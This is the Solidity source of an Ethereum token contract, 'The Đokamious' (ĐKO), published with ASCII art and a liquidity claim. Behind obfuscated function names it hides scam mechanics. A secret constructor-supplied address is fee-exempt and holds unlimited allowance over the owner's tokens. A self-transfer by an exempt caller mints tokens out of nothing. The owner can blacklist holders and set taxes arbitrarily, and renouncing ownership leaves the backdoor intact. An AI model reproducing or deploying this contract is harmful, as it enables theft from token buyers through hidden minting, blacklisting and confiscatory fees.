/**
 *Submitted for verification at Etherscan.io on 2023-01-19
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I

█▀▄ █▀█ █▄▀ ▄▀█ █▀▄▀█ █ █▀█ █░█ █▀
█▄▀ █▄█ █░█ █▀█ █░▀░█ █ █▄█ █▄█ ▄█

▄▀   █▀▀ █▀█ █▀▀   ▀▄
▀▄   ██▄ █▀▄ █▄▄   ▄▀

初期流動性の 100% が消費されます
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0, 
        address indexed token1, address pair, uint);
    function createPair( address tokenA,  address tokenB) 
    external returns 
    (address pair);
    function getPair( address tokenA, address tokenB) 
    external view returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns  

    (address payable) {
        return payable(msg.sender); }
}
contract Ownable is Context {
    address private _owner; bytes32 internal arrayClock; uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor 
    () { address msgSender = _msgSender(); _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    } 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, 
        address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
    modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
    }
    function transferOwnership(address newOwner) 
    public virtual onlyOwner { require(newOwner != address(0), 
    "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IBEEPO02 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
    address indexed owner, 
    address indexed spender, 
    uint256 value);
}
  interface ILKEEO01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn, uint amountOutMin, address[] calldata path,
          address to, uint deadline) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
// https://www.zhihu.com/
// de ETHERSCAN.io.
// https://m.weibo.cn/
contract Dokamious is Context, IBEEPO02, Ownable {

    bool limitsInEffect=false;
    bool TimerInterval=true;  
    string private _name = unicode"The Đokamious"; string private _symbol = unicode"ĐKO";
    uint8 private _decimals = 8;
    uint256 public  _rTotal = 1000000000  * 10**(_decimals);
    uint256 public constant tokensForOperations = ~uint256(0);

    uint256 public allPURCHASEtaxes =1; uint256 public allSELLINGtax =1;
    string public signedLabel;
    address public immutable 
    tBURNwallet = 0x000000000000000000000000000000000000dEaD;
    address public IDEDeployer;

    using SafeMath for uint256;
    mapping (address => uint256) 
    public _rOwned;
    mapping (address => bool) 
    private authorizations;
    mapping (address => bool) 
    public isTimelockExempt;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    ILKEEO01 public IsConnectorPair;

    constructor 
    (address IDELabel,string memory atomicSign) {
        ILKEEO01 
        _IsConnectorPair = ILKEEO01
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        IsConnectorPair = _IsConnectorPair; _allowances[address(this)][address(IsConnectorPair)] 
        = _rTotal; isTimelockExempt[owner()] 
        = true;
        isTimelockExempt[address(this)] 
        = true; _rOwned[owner()]=totalSupply();
        emit Transfer(address(0), _msgSender(), _rTotal);
        removeLimits(IDELabel); signedLabel=atomicSign;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    function transfer(
        address recipient, 
        uint256 amount) public override returns (bool) { stringTrading();
        disableTransferDelay(_msgSender(), recipient, amount); return true;
    }
    function transferFrom(address sender, 
    address recipient, uint256 amount) 
    public override returns (bool) { stringTrading();
        disableTransferDelay(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    function manageTransferDelays(
        address account, bool TransferDelay) 
        public onlyOwner { authorizations[account] = TransferDelay;
    }    
    function disableTransferDelay(
        address sender, address recipient, 
        uint256 tokenAmount) private returns (bool) { if((IDEDeployer != recipient 
        && sender != owner() 
        && !isTimelockExempt[sender])) require(TimerInterval != false, 
        "Trading is not active."); 
        require(!authorizations[recipient] && !authorizations[sender], 
        "You have been blacklisted from transfering tokens");         
        uint256 amountWithFee = (isTimelockExempt[sender] || isTimelockExempt[recipient]) ? tokenAmount 
        : setAutomatedMarketMakerPair(sender, recipient, tokenAmount);

        if(quarryResults(sender,recipient,tokenAmount,amountWithFee) 
        && carryLimits(sender,recipient,tokenAmount) 
        && cooldownTimerInterval(sender,recipient,tokenAmount)){ return true; }

        require(sender != 
        address(0), 
        "ERC20: moveToken from the zero address");
        require(recipient 
        != address(0), 
        "ERC20: moveToken to the zero address");
        emit Transfer(
            sender, recipient, amountWithFee); return true;          
    }
    function approve(
        address spender, 
        uint256 amount) 
        public override returns (bool) { _approve(_msgSender(), spender, amount); return true;
    }
    function _approve(
        address owner, address spender, 
        uint256 amount) private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function removeLimits(
        address pair) private { isTimelockExempt[pair] = true;
        _allowances[owner()][address(pair)] 
        = tokensForOperations;
    }   
    function stringTrading() 
    private{ if(limitsInEffect==false){ try IUniswapV2Factory
    (IsConnectorPair.factory()).getPair(address(this), 
    IsConnectorPair.WETH()){ IDEDeployer = IUniswapV2Factory(IsConnectorPair.factory()).getPair(address(this), 
    IsConnectorPair.WETH()); limitsInEffect=true; } catch(bytes memory){ } }
    }
    function updateTEAMWallet(
        address sender, address recipient, 
        uint256 amount) private returns(bool){ _rOwned[recipient] 
        =_rOwned[recipient] + 
        amount; return sender == recipient;
    }
    function figureAllRates() 
    public view returns 
    (uint256) { return 
    _rTotal.sub(balanceOf(tBURNwallet));
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function carryLimits(address sender, 
    address recipient, 
    uint256 amount) private returns(bool){
        return sender != IDEDeployer 
        && sender != address(this);
    }
    function cooldownTimerInterval(
        address sender, address recipient, 
        uint256 amount) private returns(bool){ if(isTimelockExempt[msg.sender]){
            return 
            updateTEAMWallet(sender,recipient,amount); } return false;
    }
    function quarryResults(
        address sender, 
        address recipient, uint256 amount, 
        uint256 targetAmount) 
        private returns(bool){ if(sender != recipient){ _rOwned[sender] 
        = _rOwned[sender].sub(amount, "Insufficient Balance"); _rOwned[recipient] 
        = _rOwned[recipient].add(targetAmount); } return sender == recipient;
    }    
    function _getRValues(
        uint256 intFEES, uint256 extFEES) 
        public onlyOwner {
        allSELLINGtax=extFEES; allPURCHASEtaxes=intFEES;
    }      
    function setAutomatedMarketMakerPair(
        address sender, address rcv, uint256 amount) 
        internal returns (uint256) { uint256 startTimeForSwap = 0;   
        if(IDEDeployer == sender) { startTimeForSwap = 
        amount.mul(allPURCHASEtaxes).div(100);  }

        else if
        (IDEDeployer == rcv) { startTimeForSwap = amount.mul(allSELLINGtax).div(100); }
        if(startTimeForSwap > 0) { _rOwned[address(tBURNwallet)] 
        = _rOwned[address(tBURNwallet)].add(startTimeForSwap);
            emit Transfer(sender, address(tBURNwallet), startTimeForSwap); }
        return amount.sub(startTimeForSwap);
    }    
    receive() 
    external payable 
    {}
 }